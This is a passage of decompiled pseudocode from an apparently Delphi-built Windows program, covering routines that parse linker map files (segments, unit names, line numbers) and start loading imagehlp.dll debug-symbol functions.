// 4058C4: using guessed type int __fastcall System::__linkproc__ ClassDestroy(_DWORD);

//----- (0042CFA0) --------------------------------------------------------
_DWORD *__fastcall sub_42CFA0(int a1, _BYTE *a2, _DWORD *a3)
{
  _BYTE *i; // ebx

  if ( !a2 )
    return sub_406C44(a3);
  for ( i = a2; *i && *i != 10 && *i != 13 && *i != 61; ++i )
    ;
  if ( *i == 61 )
  {
    while ( a2 <= i && *i != 32 )
      --i;
    while ( a2 <= i && *(i - 1) == 32 )
      --i;
  }
  return sub_42CDF0(a2, i - a2);
}

//----- (0042D010) --------------------------------------------------------
_DWORD *__fastcall sub_42D010(int a1, unsigned int lpString1, _DWORD *a3)
{
  LPCSTR i; // esi
  const CHAR *j; // ebx
  _BYTE *k; // ebx
  CHAR *v8; // ebx

  if ( !lpString1 )
    return sub_406C44(a3);
  for ( i = (LPCSTR)lpString1; *i && *i != 10 && *i != 13 && *i != 61; ++i )
    ;
  if ( *i == 61 )
  {
    while ( lpString1 <= (unsigned int)i && *i != 32 )
      --i;
    while ( lpString1 <= (unsigned int)i && *(i - 1) == 32 )
      --i;
  }
  for ( j = i; lpString1 <= (unsigned int)j && *j != 46 && *j != 124; --j )
    ;
  if ( sub_42B700(j, ".pas ", 5, 1u) || sub_42B700(j, ".obj ", 5, 1u) )
    i = j;
  for ( k = i; lpString1 <= (unsigned int)k && *k != 124 && *k != 92; --k )
    ;
  if ( lpString1 > (unsigned int)k )
    v8 = (CHAR *)lpString1;
  else
    v8 = k + 1;
  return sub_42CDF0(v8, i - v8);
}

//----- (0042D0F0) --------------------------------------------------------
_DWORD *__fastcall sub_42D0F0(int a1, _BYTE *a2, char a3, _DWORD *a4)
{
  void *v4; // esi
  unsigned __int8 *i; // ebx
  unsigned __int8 v7; // al

  v4 = a2;
  if ( !a2 )
    return sub_406C44(a4);
  if ( *a2 == 40 )
  {
    v4 = a2 + 1;
    for ( i = a2 + 1; *i && *i != 10 && *i != 13 && *i != 41; ++i )
      ;
  }
  else
  {
    i = a2;
    if ( a3 )
    {
      while ( *i && *i != 10 && *i != 13 && *i != 40 )
        ++i;
    }
    else
    {
      while ( 1 )
      {
        v7 = *i;
        if ( !*i || v7 == 40 || v7 <= 0x20u )
          break;
        ++i;
      }
    }
  }
  return sub_42CDF0(v4, i - (_BYTE *)v4);
}

//----- (0042D330) --------------------------------------------------------
bool __cdecl sub_42D330(int a1)
{
  return *(_DWORD *)(a1 - 4) >= *(_DWORD *)(a1 - 8);
}

//----- (0042D350) --------------------------------------------------------
_BYTE *__cdecl sub_42D350(int a1)
{
  _BYTE *result; // eax

  for ( result = *(_BYTE **)(a1 - 4); *(_DWORD *)(a1 - 8) > (unsigned int)result && *result <= 0x20u; ++result )
    ;
  *(_DWORD *)(a1 - 4) = result;
  return result;
}

//----- (0042D380) --------------------------------------------------------
_BYTE *__cdecl sub_42D380(int a1)
{
  _BYTE *result; // eax
  unsigned int i; // edx

  result = *(_BYTE **)(a1 - 4);
  for ( i = *(_DWORD *)(a1 - 8); i > (unsigned int)result; ++result )
  {
    if ( *result == 10 )
      break;
    if ( *result == 13 )
      break;
  }
  while ( i > (unsigned int)result && *result <= 0x20u )
    ++result;
  *(_DWORD *)(a1 - 4) = result;
  return result;
}

//----- (0042D3C0) --------------------------------------------------------
_DWORD *__usercall sub_42D3C0@<eax>(_DWORD *a1@<eax>, int a2)
{
  _BYTE *v2; // esi
  _BYTE *i; // edx
  _BYTE *j; // edx

  v2 = *(_BYTE **)(a2 - 4);
  for ( i = v2; *i && *i != 10 && *i != 13; ++i )
    ;
  *(_DWORD *)(a2 - 4) = i;
  while ( *v2 && *v2 <= 0x20u )
    ++v2;
  for ( j = i - 1; v2 < j && *j <= 0x20u; --j )
    ;
  return sub_406EB0(a1, (int)v2, j + 1 - v2);
}

//----- (0042D420) --------------------------------------------------------
int __cdecl sub_42D420(int a1)
{
  _BYTE *v1; // eax
  int v2; // esi

  v1 = *(_BYTE **)(a1 - 4);
  v2 = 0;
  while ( (unsigned __int8)(*v1 - 48) < 0xAu )
    v2 = (unsigned __int8)*v1++ - 48 + 10 * v2;
  *(_DWORD *)(a1 - 4) = v1;
  return v2;
}

//----- (0042D460) --------------------------------------------------------
int __cdecl sub_42D460(int a1)
{
  char *v1; // edx
  int v2; // esi
  char v3; // cl
  char v4; // al

  v1 = *(char **)(a1 - 4);
  v2 = 0;
  while ( 1 )
  {
    v3 = *v1;
    v4 = byte_466A3C[(unsigned __int8)*v1];
    if ( v4 < 0 )
      break;
    v2 = (unsigned __int8)v4 | (16 * v2);
    ++v1;
  }
  if ( v3 == 72 || v3 == 104 )
    ++v1;
  *(_DWORD *)(a1 - 4) = v1;
  return v2;
}

//----- (0042D4A0) --------------------------------------------------------
int __usercall sub_42D4A0@<eax>(int a1@<eax>, int a2)
{
  int result; // eax

  *(_WORD *)a1 = sub_42D460(a2);
  if ( **(_BYTE **)(a2 - 4) == 58 )
  {
    ++*(_DWORD *)(a2 - 4);
    result = sub_42D460(a2);
    *(_DWORD *)(a1 + 2) = result;
  }
  else
  {
    result = 0;
    *(_DWORD *)(a1 + 2) = 0;
  }
  return result;
}

//----- (0042D4E0) --------------------------------------------------------
_BYTE *__cdecl sub_42D4E0(int a1)
{
  _BYTE *i; // eax
  _BYTE *v2; // edx

  for ( i = *(_BYTE **)(a1 - 4); *(_DWORD *)(a1 - 8) > (unsigned int)i && *i <= 0x20u; ++i )
    ;
  v2 = i;
  while ( *i > 0x20u )
    ++i;
  *(_DWORD *)(a1 - 4) = i;
  return v2;
}

//----- (0042D510) --------------------------------------------------------
int __usercall sub_42D510@<eax>(char a1@<al>, int a2)
{
  _BYTE *i; // edx
  int result; // eax

  for ( i = *(_BYTE **)(a2 - 4); a1 != *i || i[1] != 61; ++i )
    ;
  result = a2;
  *(_DWORD *)(a2 - 4) = i + 2;
  return result;
}

//----- (0042D540) --------------------------------------------------------
BOOL __usercall sub_42D540@<eax>(int a1@<eax>, int a2)
{
  int v2; // esi
  signed int v3; // edi
  signed int v4; // eax
  signed int v5; // ebx
  unsigned int v7[2]; // [esp-Ch] [ebp-24h] BYREF
  int *v8; // [esp-4h] [ebp-1Ch]
  bool v9; // [esp+Fh] [ebp-9h]
  int v10; // [esp+10h] [ebp-8h]
  int v11; // [esp+14h] [ebp-4h] BYREF
  int savedregs; // [esp+18h] [ebp+0h] BYREF

  v11 = 0;
  v10 = a1;
  v8 = &savedregs;
  v7[1] = (unsigned int)&loc_42D5EF;
  v7[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v7);
  v9 = 0;
  while ( !sub_42D330(a2) )
  {
    sub_42D3C0(&v11, a2);
    v2 = 0;
    v3 = 0;
    while ( 1 )
    {
      v4 = sub_407B7C(*(_DWORD *)(v10 + 4 * v2), v11, 1);
      v5 = v4;
      if ( v3 >= v4 )
        break;
      v3 = v4;
      if ( ++v2 > 3 )
        goto LABEL_6;
    }
    v5 = 0;
LABEL_6:
    v9 = v5 != 0;
    if ( v5 )
      break;
    sub_42D380(a2);
  }
  if ( !sub_42D330(a2) )
    sub_42D350(a2);
  __writefsdword(0, v7[0]);
  v8 = (int *)&loc_42D5F6;
  sub_406C44(&v11);
  return v9;
}

//----- (0042D610) --------------------------------------------------------
int __usercall sub_42D610@<eax>(int a1@<eax>, int a2)
{
  _BYTE *v2; // ebx
  int v3; // eax
  int i; // esi
  int v5; // eax
  unsigned __int8 v6; // zf
  unsigned int v8[2]; // [esp-Ch] [ebp-20h] BYREF
  int *v9; // [esp-4h] [ebp-18h]
  unsigned __int8 v10; // [esp+Bh] [ebp-9h]
  int v11; // [esp+Ch] [ebp-8h]
  int v12; // [esp+10h] [ebp-4h] BYREF
  int savedregs; // [esp+14h] [ebp+0h] BYREF

  v12 = 0;
  v11 = a1;
  v9 = &savedregs;
  v8[1] = (unsigned int)&loc_42D6D6;
  v8[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v8);
  if ( sub_42D330(a2) )
  {
    v10 = 0;
  }
  else
  {
    sub_42D350(a2);
    v2 = *(_BYTE **)(a2 - 4);
    v3 = v11;
    if ( v11 )
      v3 = *(_DWORD *)(v11 - 4);
    for ( i = v3; !sub_42D330(a2) && *v2 != 13 && *v2 && i > 0; --i )
      ++v2;
    v5 = v11;
    if ( v11 )
      v5 = *(_DWORD *)(v11 - 4);
    sub_406EB0(&v12, *(_DWORD *)(a2 - 4), v5);
    sub_407AA0(v12, v11);
    v10 = v6;
    if ( v6 )
      *(_DWORD *)(a2 - 4) = v2;
    sub_42D350(a2);
  }
  __writefsdword(0, v8[0]);
  v9 = (int *)&loc_42D6DD;
  sub_406C44(&v12);
  return v10;
}
// 42D6A6: variable 'v6' is possibly undefined

//----- (0042D6F0) --------------------------------------------------------
int __fastcall sub_42D6F0(int *a1)
{
  int result; // eax
  int v3; // eax
  int v4; // esi
  _BYTE *v5; // edi
  int v6; // esi
  _BYTE *v7; // edi
  _BYTE *v8; // edi
  _BYTE *v9; // edi
  int v10; // esi
  CHAR *lpString1; // [esp+Ch] [ebp-14h]
  LPCSTR lpString1a; // [esp+Ch] [ebp-14h]
  _WORD v13[3]; // [esp+12h] [ebp-Eh] BYREF
  _BYTE *v14; // [esp+18h] [ebp-8h]
  _BYTE *v15; // [esp+1Ch] [ebp-4h]
  int savedregs; // [esp+20h] [ebp+0h] BYREF

  sub_4051B8(v13, 6, 0);
  result = a1[1];
  if ( result )
  {
    v15 = *(_BYTE **)(result + 4);
    v3 = (**(int (__fastcall ***)(int))a1[1])(a1[1]);
    v14 = &v15[v3];
    if ( sub_42D540((int)&off_466B3C, (int)&savedregs) )
    {
      while ( (unsigned __int8)sub_42CE90(v15) )
      {
        sub_42D4A0((int)v13, (int)&savedregs);
        sub_42D350((int)&savedregs);
        v4 = sub_42D460((int)&savedregs);
        v5 = sub_42D4E0((int)&savedregs);
        lpString1 = sub_42D4E0((int)&savedregs);
        sub_42D380((int)&savedregs);
        sub_42DAD0(a1, (int)v13, v4, v5, lpString1);
      }
    }
    if ( sub_42D540((int)&off_466B4C, (int)&savedregs) )
    {
      while ( (unsigned __int8)sub_42CE90(v15) )
      {
        sub_42D4A0((int)v13, (int)&savedregs);
        sub_42D350((int)&savedregs);
        v6 = sub_42D460((int)&savedregs);
        sub_42D510(67, (int)&savedregs);
        v7 = sub_42D4E0((int)&savedregs);
        sub_42D510(77, (int)&savedregs);
        lpString1a = sub_42D4E0((int)&savedregs);
        sub_42D380((int)&savedregs);
        sub_42E200(a1, (int)v13, v6, (int)v7, (int)lpString1a);
      }
    }
    if ( sub_42D540((int)&off_466B5C, (int)&savedregs) )
    {
      if ( (unsigned __int8)sub_42DF20() )
      {
        while ( (unsigned __int8)sub_42CE90(v15) )
        {
          sub_42D4A0((int)v13, (int)&savedregs);
          v8 = sub_42D4E0((int)&savedregs);
          sub_42D380((int)&savedregs);
          nullsub_6(a1, v13, v8);
        }
      }
      else
      {
        v15 = sub_42CEA0(v15, (unsigned int)v14);
      }
    }
    if ( sub_42D540((int)&off_466B6C, (int)&savedregs) )
    {
      if ( sub_42DF30() )
      {
        while ( !sub_42D330((int)&savedregs) && (unsigned __int8)sub_42CE90(v15) )
        {
          sub_42D4A0((int)v13, (int)&savedregs);
          v9 = sub_42D4E0((int)&savedregs);
          sub_42D380((int)&savedregs);
          sub_42DFE0(a1, (int)v13, (int)v9);
        }
      }
      else
      {
        v15 = sub_42CEA0(v15, (unsigned int)v14);
      }
    }
    while ( 1 )
    {
      result = sub_42D610((int)off_466B7C, (int)&savedregs);
      if ( !(_BYTE)result )
        break;
      a1[3] = (int)v15;
      for ( a1[4] = (int)v15; *(_BYTE *)a1[4] != 40; ++a1[4] )
        ;
      sub_42D380((int)&savedregs);
      sub_42DE90((int)a1, a1[3], a1[4]);
      do
      {
        sub_42D350((int)&savedregs);
        v10 = sub_42D420((int)&savedregs);
        sub_42D350((int)&savedregs);
        sub_42D4A0((int)v13, (int)&savedregs);
        sub_42D350((int)&savedregs);
        sub_42DCD0(a1, v10, (int)v13);
      }
      while ( (unsigned __int8)sub_42CE90(v15) );
    }
  }
  return result;
}
// 42DFD0: using guessed type int __fastcall nullsub_6(_DWORD, _DWORD, _DWORD);
// 466B3C: using guessed type wchar_t *off_466B3C;
// 466B4C: using guessed type wchar_t *off_466B4C;
// 466B5C: using guessed type wchar_t *off_466B5C;
// 466B6C: using guessed type wchar_t *off_466B6C;
// 466B7C: using guessed type wchar_t *off_466B7C;
// 42D6F0: using guessed type _WORD var_E[3];

//----- (0042D960) --------------------------------------------------------
int __fastcall sub_42D960(int a1, unsigned int a2)
{
  int v2; // ecx
  int v3; // edi
  int i; // esi
  int v5; // ecx
  int v6; // edi
  int v7; // ecx
  int v9; // [esp+0h] [ebp-10h]

  v9 = *(_DWORD *)(a1 + 32);
  v2 = v9;
  if ( v9 )
    v2 = *(_DWORD *)(v9 - 4);
  v3 = v2 - 1;
  i = *(_DWORD *)(a1 + 60);
  if ( v2 - 1 < i || (v5 = *(_DWORD *)(a1 + 32) + 24 * i, a2 < *(_DWORD *)(v5 + 4)) || a2 >= *(_DWORD *)(v5 + 8) )
  {
    if ( v3 < 0 )
    {
      return -1;
    }
    else
    {
      v6 = v3 + 1;
      for ( i = 0; ; ++i )
      {
        v7 = *(_DWORD *)(a1 + 32) + 24 * i;
        if ( a2 >= *(_DWORD *)(v7 + 4) && a2 < *(_DWORD *)(v7 + 8) )
          break;
        if ( !--v6 )
          return -1;
      }
      *(_DWORD *)(a1 + 60) = i;
    }
  }
  return i;
}

//----- (0042D9C0) --------------------------------------------------------
unsigned int __fastcall sub_42D9C0(int a1, unsigned int a2)
{
  int v2; // ecx
  int v6; // [esp+0h] [ebp-4h]

  v6 = *(_DWORD *)(a1 + 20);
  v2 = v6;
  if ( v6 )
    v2 = *(_DWORD *)(v6 - 4);
  if ( v2 > 0 && *(_DWORD *)(*(_DWORD *)(a1 + 20) + 4) != 0 && a2 >= *(_DWORD *)(*(_DWORD *)(a1 + 20) + 4) )
    a2 -= *(_DWORD *)(*(_DWORD *)(a1 + 20) + 4);
  return a2;
}

//----- (0042DA10) --------------------------------------------------------
volatile __int32 *__fastcall sub_42DA10(int a1, int a2, volatile __int32 *a3)
{
  volatile __int32 *result; // eax

  result = sub_406FE8(a3, *(_DWORD *)a2);
  if ( !*a3 )
  {
    sub_42CFA0(a1, *(_BYTE **)(a2 + 4), a3);
    return sub_406FE8((volatile __int32 *)a2, *a3);
  }
  return result;
}

//----- (0042DA50) --------------------------------------------------------
volatile __int32 *__fastcall sub_42DA50(int a1, int a2, volatile __int32 *a3)
{
  volatile __int32 *result; // eax

  result = sub_406FE8(a3, *(_DWORD *)a2);
  if ( !*a3 )
  {
    sub_42D010(a1, *(_DWORD *)(a2 + 4), a3);
    return sub_406FE8((volatile __int32 *)a2, *a3);
  }
  return result;
}

//----- (0042DA90) --------------------------------------------------------
volatile __int32 *__fastcall sub_42DA90(int a1, int a2, char a3, volatile __int32 *a4)
{
  volatile __int32 *result; // eax

  result = sub_406FE8(a4, *(_DWORD *)a2);
  if ( !*a4 )
  {
    sub_42D0F0(a1, *(_BYTE **)(a2 + 4), a3, a4);
    return sub_406FE8((volatile __int32 *)a2, *a4);
  }
  return result;
}

//----- (0042DAD0) --------------------------------------------------------
int __fastcall sub_42DAD0(int *a1, int a2, int a3, _BYTE *a4, CHAR *lpString1)
{
  int v6; // eax
  int v7; // esi
  int v8; // edi
  int v9; // eax
  unsigned int v11[2]; // [esp-Ch] [ebp-34h] BYREF
  int *v12; // [esp-4h] [ebp-2Ch]
  BOOL *v13; // [esp+Ch] [ebp-1Ch] BYREF
  BOOL *v14; // [esp+10h] [ebp-18h] BYREF
  _DWORD *v15; // [esp+14h] [ebp-14h]
  _DWORD *v16; // [esp+18h] [ebp-10h]
  int v17; // [esp+1Ch] [ebp-Ch]
  int v18; // [esp+20h] [ebp-8h]
  int v19; // [esp+24h] [ebp-4h]
  int savedregs; // [esp+28h] [ebp+0h] BYREF

  v13 = 0;
  v14 = 0;
  v18 = a3;
  v19 = a2;
  v12 = &savedregs;
  v11[1] = (unsigned int)&loc_42DC3C;
  v11[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v11);
  v17 = a1[5];
  v6 = v17;
  if ( v17 )
    v6 = *(_DWORD *)(v17 - 4);
  v7 = v6;
  System::__linkproc__ DynArraySetLength(v6 + 1);
  v8 = 11 * v7;
  *(_WORD *)(a1[5] + 4 * v8) = *(_WORD *)v19;
  *(_DWORD *)(a1[5] + 4 * v8 + 4) = *(_DWORD *)(v19 + 2);
  *(_DWORD *)(a1[5] + 4 * v8 + 8) = *(_DWORD *)(v19 + 2);
  if ( sub_42B700(lpString1, dword_42DC4C, 3, 1u) )
  {
    *(_DWORD *)(a1[5] + 44 * v7 + 12) = *(_DWORD *)(a1[5] + 44 * v7 + 4);
    *(_BYTE *)(a1[5] + 44 * v7 + 40) = 1;
  }
  else
  {
    *(_DWORD *)(a1[5] + 44 * v7 + 12) = sub_42D9C0((int)a1, *(_DWORD *)(a1[5] + 44 * v7 + 4));
    *(_BYTE *)(a1[5] + 44 * v7 + 40) = 0;
  }
  *(_DWORD *)(a1[5] + 44 * v7 + 16) = v18;
  *(_DWORD *)(a1[5] + 44 * v7 + 24) = a4;
  *(_DWORD *)(a1[5] + 44 * v7 + 36) = lpString1;
  if ( a1[2] )
  {
    v16 = (_DWORD *)a1[2];
    sub_42D0F0(*a1, a4, 0, &v14);
    v9 = sub_42BEE0(v16, v14);
    if ( !v9 )
    {
      v15 = (_DWORD *)a1[2];
      sub_42D0F0(*a1, lpString1, 0, &v13);
      v9 = sub_42BEE0(v15, v13);
    }
    if ( v9 )
    {
      *(_DWORD *)(a1[5] + 44 * v7 + 8) = *(_DWORD *)(v9 + 12) + a1[2];
      *(_DWORD *)(a1[5] + 44 * v7 + 12) = *(_DWORD *)(v9 + 12);
    }
  }
  __writefsdword(0, v11[0]);
  v12 = (int *)&loc_42DC43;
  return sub_406CA4((int)&v13, 2);
}
// 408A10: using guessed type int __cdecl System::__linkproc__ DynArraySetLength(_DWORD);

//----- (0042DC50) --------------------------------------------------------
int __fastcall sub_42DC50(int a1, unsigned int a2, _DWORD *a3)
{
  unsigned int v4; // esi
  int v5; // eax
  int v7; // [esp+8h] [ebp-Ch]
  unsigned int v9; // [esp+10h] [ebp-4h] BYREF

  v9 = a2;
  v4 = sub_42DEF0(a1, a2);
  v7 = 0;
  *a3 = 0;
  v5 = sub_42B410(*(_DWORD *)(a1 + 24), 12, (int (__fastcall *)(unsigned int, int))sub_42CE40, (int)&v9, 1);
  if ( v5 != -1 && v4 <= *(_DWORD *)(*(_DWORD *)(a1 + 24) + 12 * v5 + 4) )
  {
    v7 = *(_DWORD *)(*(_DWORD *)(a1 + 24) + 12 * v5 + 8);
    *a3 = v9 - *(_DWORD *)(*(_DWORD *)(a1 + 24) + 12 * v5 + 4);
  }
  return v7;
}
// 42CE40: using guessed type int sub_42CE40();

//----- (0042DCD0) --------------------------------------------------------
unsigned int __fastcall sub_42DCD0(_DWORD *a1, int a2, int a3)
{
  unsigned int result; // eax
  int v5; // esi
  int v6; // eax
  int v7; // eax
  int v8; // eax
  int v9; // [esp+Ch] [ebp-28h]
  int v10; // [esp+10h] [ebp-24h]
  int v11; // [esp+14h] [ebp-20h]
  int v12; // [esp+1Ch] [ebp-18h]
  char v13; // [esp+23h] [ebp-11h]
  unsigned int v14; // [esp+24h] [ebp-10h]
  int v15; // [esp+28h] [ebp-Ch]

  v13 = 0;
  v11 = a1[5];
  if ( v11 )
    v11 = *(_DWORD *)(v11 - 4);
  result = v11 - 1;
  if ( v11 - 1 >= 0 )
  {
    v12 = v11;
    v5 = 0;
    while ( 1 )
    {
      result = *(unsigned __int16 *)(a1[5] + 44 * v5);
      if ( (_WORD)result == *(_WORD *)a3 )
      {
        result = *(_DWORD *)(a1[5] + 44 * v5 + 16);
        if ( result > *(_DWORD *)(a3 + 2) )
        {
          result = *(_BYTE *)(a1[5] + 44 * v5 + 40)
                 ? *(_DWORD *)(a3 + 2)
                 : sub_42D9C0((int)a1, *(_DWORD *)(a3 + 2) + *(_DWORD *)(a1[5] + 44 * v5 + 4));
          v14 = result;
          if ( result )
            break;
        }
      }
      ++v5;
      if ( !--v12 )
        goto LABEL_22;
    }
    v10 = a1[6];
    v6 = v10;
    if ( v10 )
      v6 = *(_DWORD *)(v10 - 4);
    if ( v6 == a1[10] )
    {
      if ( (int)a1[10] >= 512 )
        System::__linkproc__ DynArraySetLength(2 * a1[10]);
      else
        System::__linkproc__ DynArraySetLength(a1[10] + 512);
    }
    *(_WORD *)(a1[6] + 12 * a1[10]) = *(_WORD *)(a1[5] + 44 * v5);
    *(_DWORD *)(a1[6] + 12 * a1[10] + 4) = v14;
    result = 3 * a1[10];
    *(_DWORD *)(a1[6] + 12 * a1[10]++ + 8) = a2;
    v13 = 1;
    if ( a1[12] )
    {
      v9 = a1[9];
      v7 = v9;
      if ( v9 )
        v7 = *(_DWORD *)(v9 - 4);
      v15 = v7;
      System::__linkproc__ DynArraySetLength(v7 + 1);
      v8 = 5 * v15;
      *(_WORD *)(a1[9] + 4 * v8) = *(_WORD *)(a1[5] + 44 * v5);
      *(_DWORD *)(a1[9] + 4 * v8 + 4) = v14;
      *(_DWORD *)(a1[9] + 4 * v8 + 12) = a1[12];
      result = 0;
      a1[12] = 0;
    }
  }
LABEL_22:
  if ( !v13 )
    ++a1[11];
  return result;
}
// 408A10: using guessed type int __cdecl System::__linkproc__ DynArraySetLength(_DWORD);

//----- (0042DE90) --------------------------------------------------------
int __fastcall sub_42DE90(int result, int a2, int a3)
{
  *(_DWORD *)(result + 48) = a3;
  return result;
}

//----- (0042DEA0) --------------------------------------------------------
volatile __int32 *__fastcall sub_42DEA0(int *a1, unsigned int a2, volatile __int32 *a3)
{
  int v5; // eax

  v5 = sub_42D960((int)a1, a2);
  if ( v5 == -1 )
    return sub_406C44(a3);
  else
    return sub_42DA50(*a1, a1[8] + 24 * v5 + 12, a3);
}

//----- (0042DEF0) --------------------------------------------------------
int __fastcall sub_42DEF0(int a1, unsigned int a2)
{
  int v3; // eax
  int v4; // edx

  v3 = sub_42D960(a1, a2);
  v4 = -1;
  if ( v3 != -1 )
    return *(_DWORD *)(*(_DWORD *)(a1 + 32) + 24 * v3 + 4);
  return v4;
}

//----- (0042DF20) --------------------------------------------------------
int sub_42DF20()
{
  return 0;
}

//----- (0042DF30) --------------------------------------------------------
char sub_42DF30()
{
  return 1;
}

//----- (0042DF40) --------------------------------------------------------
int __fastcall sub_42DF40(int *a1, unsigned int a2, _DWORD *a3, volatile __int32 *a4)
{
  unsigned int v5; // edi
  int result; // eax
  int v7; // esi
  unsigned int v9; // [esp+10h] [ebp-4h] BYREF

  v9 = a2;
  v5 = sub_42DEF0((int)a1, a2);
  sub_406C44(a4);
  *a3 = 0;
  result = sub_42B410(a1[7], 20, (int (__fastcall *)(unsigned int, int))sub_42CE50, (int)&v9, 1);
  v7 = result;
  if ( result != -1 )
  {
    result *= 5;
    if ( v5 <= *(_DWORD *)(a1[7] + 20 * v7 + 4) )
    {
      sub_42DA90(*a1, a1[7] + 20 * v7 + 8, 1, a4);
      result = (int)a3;
      *a3 = v9 - *(_DWORD *)(a1[7] + 20 * v7 + 4);
    }
  }
  return result;
}
// 42CE50: using guessed type int sub_42CE50();

//----- (0042DFE0) --------------------------------------------------------
int __fastcall sub_42DFE0(_DWORD *a1, int a2, int a3)
{
  int v4; // eax
  int result; // eax
  int i; // esi
  int v7; // eax
  int v8; // [esp+Ch] [ebp-10h]
  int v9; // [esp+10h] [ebp-Ch]

  v9 = a1[5];
  v4 = v9;
  if ( v9 )
    v4 = *(_DWORD *)(v9 - 4);
  result = v4 - 1;
  if ( result >= 0 )
  {
    ++result;
    for ( i = 0; *(_WORD *)(a1[5] + 44 * i) != *(_WORD *)a2 || *(_DWORD *)(a1[5] + 44 * i + 16) <= *(_DWORD *)(a2 + 2); ++i )
    {
      if ( !--result )
        return result;
    }
    v8 = a1[7];
    v7 = v8;
    if ( v8 )
      v7 = *(_DWORD *)(v8 - 4);
    if ( v7 == a1[13] )
    {
      if ( (int)a1[13] >= 512 )
        System::__linkproc__ DynArraySetLength(2 * a1[13]);
      else
        System::__linkproc__ DynArraySetLength(a1[13] + 512);
    }
    *(_WORD *)(a1[7] + 20 * a1[13]) = *(_WORD *)(a1[5] + 44 * i);
    if ( *(_BYTE *)(a1[5] + 44 * i + 40) )
      *(_DWORD *)(a1[7] + 20 * a1[13] + 4) = *(_DWORD *)(a2 + 2);
    else
      *(_DWORD *)(a1[7] + 20 * a1[13] + 4) = sub_42D9C0((int)a1, *(_DWORD *)(a2 + 2) + *(_DWORD *)(a1[5] + 44 * i + 4));
    result = 5 * a1[13];
    *(_DWORD *)(a1[7] + 20 * a1[13]++ + 12) = a3;
  }
  return result;
}
// 408A10: using guessed type int __cdecl System::__linkproc__ DynArraySetLength(_DWORD);

//----- (0042E110) --------------------------------------------------------
_DWORD *__fastcall sub_42E110(int *a1)
{
  int v2; // eax
  int v3; // eax
  int v5; // [esp+4h] [ebp-8h]
  int v6; // [esp+8h] [ebp-4h]

  a1[11] = 0;
  a1[14] = 0;
  a1[13] = 0;
  a1[15] = 0;
  sub_42D6F0(a1);
  System::__linkproc__ DynArraySetLength(a1[10]);
  System::__linkproc__ DynArraySetLength(a1[13]);
  System::__linkproc__ DynArraySetLength(a1[14]);
  if ( a1[6] )
  {
    v6 = a1[6];
    v2 = v6;
    if ( v6 )
      v2 = *(_DWORD *)(v6 - 4);
    sub_42CBC0(a1[6], 0, v2 - 1);
  }
  if ( a1[7] )
  {
    v5 = a1[7];
    v3 = v5;
    if ( v5 )
      v3 = *(_DWORD *)(v5 - 4);
    sub_42CCC0(a1[7], 0, v3 - 1);
  }
  sub_42B660(a1[8], 24, (int)sub_42CE70);
  return sub_42B660(a1[9], 20, (int)sub_42CE60);
}
// 408A10: using guessed type int __cdecl System::__linkproc__ DynArraySetLength(_DWORD);
// 42CE60: using guessed type int sub_42CE60();

//----- (0042E200) --------------------------------------------------------
int __fastcall sub_42E200(_DWORD *a1, int a2, int a3, int a4, int a5)
{
  int v6; // eax
  int result; // eax
  int i; // esi
  int v9; // [esp+Ch] [ebp-10h]
  int v10; // [esp+10h] [ebp-Ch]
  unsigned int v11; // [esp+14h] [ebp-8h]

  v9 = a1[5];
  v6 = v9;
  if ( v9 )
    v6 = *(_DWORD *)(v9 - 4);
  result = v6 - 1;
  if ( result >= 0 )
  {
    v10 = result + 1;
    for ( i = 0; ; ++i )
    {
      result = *(unsigned __int16 *)(a1[5] + 44 * i);
      if ( (_WORD)result == *(_WORD *)a2 )
      {
        result = *(_DWORD *)(a1[5] + 44 * i + 16);
        if ( (unsigned int)result > *(_DWORD *)(a2 + 2) )
          break;
      }
      if ( !--v10 )
        return result;
    }
    if ( *(_BYTE *)(a1[5] + 44 * i + 40) )
      v11 = *(_DWORD *)(a2 + 2);
    else
      v11 = sub_42D9C0((int)a1, *(_DWORD *)(a2 + 2) + *(_DWORD *)(a1[5] + 44 * i + 4));
    if ( !(a1[14] % 16) )
      System::__linkproc__ DynArraySetLength(a1[14] + 16);
    *(_WORD *)(a1[8] + 24 * a1[14]) = *(_WORD *)(a1[5] + 44 * i);
    *(_DWORD *)(a1[8] + 24 * a1[14] + 4) = v11;
    *(_DWORD *)(a1[8] + 24 * a1[14] + 8) = a3 + v11;
    result = 3 * a1[14];
    *(_DWORD *)(a1[8] + 24 * a1[14]++ + 16) = a5;
  }
  return result;
}
// 408A10: using guessed type int __cdecl System::__linkproc__ DynArraySetLength(_DWORD);

//----- (0042E310) --------------------------------------------------------
volatile __int32 *__fastcall sub_42E310(int *a1, unsigned int a2, volatile __int32 *a3)
{
  volatile __int32 *result; // eax
  volatile __int32 *v6; // esi
  unsigned int v7; // [esp+Ch] [ebp-8h]
  unsigned int v8; // [esp+10h] [ebp-4h] BYREF

  v8 = a2;
  v7 = sub_42DEF0((int)a1, a2);
  sub_406C44(a3);
  result = (volatile __int32 *)sub_42B410(a1[9], 20, (int (__fastcall *)(unsigned int, int))sub_42CE50, (int)&v8, 1);
  v6 = result;
  if ( result != (volatile __int32 *)-1 )
  {
    result = *(volatile __int32 **)(a1[9] + 20 * (_DWORD)result + 4);
    if ( (unsigned int)result >= v7 )
      result = sub_42DA90(*a1, a1[9] + 20 * (_DWORD)v6 + 8, 0, a3);
  }
  if ( !*a3 )
  {
    result = (volatile __int32 *)sub_42D960((int)a1, v8);
    if ( result != (volatile __int32 *)-1 )
      return sub_42DA10(*a1, a1[8] + 24 * (_DWORD)result + 12, a3);
  }
  return result;
}
// 42CE50: using guessed type int sub_42CE50();

//----- (0042E3B0) --------------------------------------------------------
int sub_42E3B0()
{
  int v0; // ebx
  const CHAR *v1; // eax
  const CHAR *v2; // eax
  const CHAR *v3; // eax
  const CHAR *v4; // eax
  const CHAR *v5; // eax
  const CHAR *v6; // eax
  const CHAR *v7; // eax
  const CHAR *v8; // eax
  const CHAR *v9; // eax
  const CHAR *v10; // eax
  const CHAR *v11; // eax
  const CHAR *v12; // eax

  v0 = 0;
  hLibModule = sub_426EB0((int)L"imagehlp.dll", 1);
  if ( hLibModule )
  {
    v1 = (const CHAR *)sub_4074F8((int)"SymInitialize");
    dword_466B84 = (int)GetProcAddress_1(hLibModule, v1);
    v2 = (const CHAR *)sub_4074F8((int)"SymInitializeW");
    dword_466B88 = (int)GetProcAddress_1(hLibModule, v2);
